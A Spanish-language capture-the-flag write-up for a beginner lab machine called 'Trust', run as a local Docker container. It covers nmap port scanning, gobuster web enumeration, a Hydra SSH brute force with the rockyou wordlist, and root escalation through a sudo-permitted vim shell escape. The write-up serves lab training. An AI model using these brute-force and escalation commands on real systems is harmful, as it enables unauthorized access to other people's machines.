# 🔐 Máquina: Trust  
**Dificultad:** Muy Fácil  

## 📌 Descripción  
La máquina Trust está diseñada para practicar técnicas básicas de enumeración web, fuerza bruta por SSH y escalada de privilegios a través de la ejecución de binarios con permisos elevados.

---

## ⚙️ Despliegue de la Máquina  

Primero descargamos el archivo comprimido y lo descomprimimos con:

```bash
unzip trust.zip
```

Luego desplegamos la máquina con:

```bash
sudo bash auto_deploy.sh trust.tar
```

![Inicio del despliegue](/Trust/Imagenes/Inicio.jpeg)

---

## 📡 Verificación de Conectividad  

Verificamos que la máquina esté activa con un simple ping a su IP (172.18.0.2):

```bash
ping -c4 172.18.0.2
```

![Ping a la máquina](/Trust/Imagenes/Ping.jpeg)

---

## 🔎 Escaneo de Puertos con Nmap  

Ejecutamos un escaneo de todos los puertos para descubrir servicios activos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts.txt
```

**Puertos detectados:**  
- **22/tcp** (SSH)  
- **80/tcp** (HTTP)

![Puertos abiertos](/Trust/Imagenes/Puertos.jpeg)

---

## 📂 Extracción de Puertos  

Usamos un script personalizado para extraer la IP y puertos abiertos desde el resultado anterior y realizar un escaneo más detallado:

```bash
nmap -sC -sV -p 22,80 172.18.0.2 -oN target.txt
```

**Opciones utilizadas:**
- `-sC`: Scripts por defecto de Nmap.
- `-sV`: Detección de versiones.
- `-p 22,80`: Puertos específicos detectados previamente.
- `-oN`: Salida en formato legible.

![Detección de servicios](/Trust/Imagenes/Servicios.jpeg)

---

## 🌐 Exploración del Servicio Web  

Visitamos la dirección web en el puerto 80 y encontramos la página por defecto de Apache:

![Página web por defecto](/Trust/Imagenes/Pagina.jpeg)

---

## 🗂️ Enumeración de Directorios con Gobuster  

Utilizamos **Gobuster** para buscar recursos ocultos en el servidor web:

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Con esta búsqueda encontramos una página `.php` interesante.

![Salida de Gobuster (vista desde BurpSuite)](/Trust/Imagenes/Burpsuite.jpeg)  
![Página descubierta](/Trust/Imagenes/Web.jpeg)

---

## 🧪 Ataque de Fuerza Bruta con Hydra  

Como el servicio SSH está activo, comenzamos pruebas para identificar credenciales válidas. Probamos con `root`, y luego con el nombre `Mario`, hasta que identificamos que el usuario correcto es `mario`.

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

![Ataque con Hydra](/Trust/Imagenes/Hydra.jpeg)

---

## ✅ Acceso por SSH  

Ingresamos al sistema con el usuario `mario` y la contraseña encontrada:

```bash
ssh mario@172.18.0.2
```

![Acceso SSH exitoso](/Trust/Imagenes/SSH.jpeg)

---

## ⬆️ Escalada de Privilegios  

Revisamos los permisos sudo del usuario `mario` con:

```bash
sudo -l
```

Se muestra que `mario` puede ejecutar `/usr/bin/vim` como **cualquier usuario**, incluyendo `root`.

Para obtener una shell como root desde `vim`, ejecutamos:

```bash
sudo /usr/bin/vim -c ':!sh'
```

Esto funciona porque `vim` se está ejecutando como root, y el comando `:!sh` invoca una shell con esos mismos privilegios.

![Escalada de privilegios con Vim](/Trust/Imagenes/Escalada.jpeg)

---

## 🧠 Conclusión  

La máquina **Trust** ofrece un excelente ejercicio introductorio para practicar:
- Despliegue y verificación de entornos Docker vulnerables.
- Enumeración de puertos y servicios con Nmap.
- Búsqueda de recursos web ocultos con Gobuster.
- Ataques de fuerza bruta con Hydra.
- Escalada de privilegios mediante binarios con permisos sudo.
